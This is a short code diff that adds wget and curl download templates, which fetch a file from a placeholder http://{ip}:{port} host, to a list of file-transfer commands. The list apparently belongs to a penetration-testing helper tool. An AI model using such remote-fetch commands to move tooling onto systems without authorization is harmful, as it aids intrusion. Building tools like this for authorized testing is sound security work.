@@ -18,4 +18,12 @@ export default [
     name: 'CMD - SMB',
     command: 'copy \\\\{ip}\\files\\{source} {destination}',
   },
+  {
+    name: 'Linux - wget',
+    command: 'wget http://{ip}:{port}/{source} -O {destination}',
+  },
+  {
+    name: 'Linux - curl',
+    command: 'curl http://{ip}:{port}/{source} -o {destination}',
+  },
 ];
